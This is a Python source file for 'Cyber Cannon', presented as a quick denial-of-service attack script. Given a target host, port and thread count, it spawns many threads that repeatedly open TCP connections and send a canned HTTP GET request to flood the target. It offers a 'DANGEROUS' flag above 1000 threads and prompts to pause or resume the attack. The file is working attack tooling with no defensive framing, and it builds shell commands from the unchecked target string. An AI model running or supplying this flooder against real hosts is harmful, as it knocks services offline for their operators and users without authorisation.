#!/usr/bin/python3
#
# Cyber Cannon: Quick DoS attack script.
#
# GitHub: https://github.com/parsa-kazazi

import sys
import os
import socket
from threading import Thread
from queue import Queue
import time
import subprocess

info = "[*] "
ok = "[+] "
err = "[!] "

stop = False

packet = """GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive
"""

print(r"""
            _                                           
  ___  _ _ | |_  ___  ___  ___  ___  ___  ___  ___  ___ 
 |  _|| | || . || -_||  _||  _|| .'||   ||   || . ||   |
 |___||_  ||___||___||_|  |___||__,||_|_||_|_||___||_|_|
      |___|                                             

            Quick DOS script - By @R00TUS3R
""")

def show_usage():
    print("""            Usage: python cybercannon.py [host] [port] [threads]\n
            host: Target domain or IP
            port: Target port
            threads: number of threads (default: 130)\n\n""")
    exit()

def now_time(): return time.strftime("%H:%M:%S")

def getparametrs():
    global target_host, port, turbo_count

    try:
        target_host = sys.argv[1]
        port = int(sys.argv[2])
    except:
        show_usage()
    try:
        turbo_count = int(sys.argv[3])
    except:
        turbo_count = 130

def main():
    getparametrs()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        global target_ip
        target_ip = socket.gethostbyname(target_host)
    except Exception as error_msg:
        print(err + target_host + ": " + str(error_msg) + "\n")
        exit()

    print(info + "Checking connection to " + target_host + " port " + str(port) + " ...")

    try:
        sock.connect((target_ip, port))
        sock.settimeout(1)
    except Exception as error_msg:
        print(err + str(error_msg) + "\n")
        exit()
    else:
        print(ok + "Connected")

        if os.name == "nt":
            param = "-n"
        elif os.name == "posix":
            param = "-c"

        ping_output = subprocess.getoutput("ping " + target_ip + " " + param + " 1")
        ping_output = ping_output.split("\n")
        ping_output = ping_output[1]

        print(info + "Ping: " + ping_output + "\n")

    print(info + "Target host: " + target_host)
    print(info + "Target port: " + str(port))
    sys.stdout.write(info + "Turbo count: " + str(turbo_count))

    if turbo_count >= 1000:
        sys.stdout.write(" [DANGEROUS]")

    print("\n" + info + "For stop attack press CTRL+C.\n")
    print(info + now_time() + " ==> Starting attack...")
    time.sleep(3)

    if os.name == "nt":
        os.system("title Attacking to " + target_host + ":" + str(port))
    elif os.name == "posix":
        os.system("printf '\033]2;Attacking to " + target_host + ":" + str(port) + "\a'")

    attack()

def send_packet(item):
    while True:
        if stop:
            pass
        else:
            try:
                attack_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                attack_sock.connect((target_ip, port))

                if attack_sock.sendto(bytes(packet, "UTF-8"), (target_ip, port)):
                    attack_sock.shutdown(1)
                    print(ok + now_time() + " ==> Packet Sent to " + target_host + " trough port " + str(port))
                else:
                    attack_sock.shutdown(1)
                    print(err + now_time() + " ==> Shut down")
                time.sleep(0.1)
            except Exception as error_msg:
                print(err + now_time() + " ==> " + str(error_msg))
                time.sleep(0.1)


def run():
    while True:
        item = q.get()
        send_packet(item)
        q.task_done()


def attack():
    global q
    q = Queue()

    while True:
        try:
            for thread in range(turbo_count):
                if stop:
                    pass
                else:
                    thr = Thread(target=run, daemon=True)
                    thr.start()

            item = 0

            while True:
                if item > 1800:
                    item = 0
                    time.sleep(0.1)

                item += 1
                q.put(item)

            q.join()
        except KeyboardInterrupt:
            stop_attack()


def stop_attack():
    global stop
    stop = True

    print("\n" + err + now_time() + " ==> Attack paused.")

    question = input(info + "Stop attack (y/n)? ")

    if question == "y":
        print(info + now_time() + " ==> Attack finished.\n")
        exit()
    elif question == "n":
        stop = False
        attack()
    else:
        exit()

main()
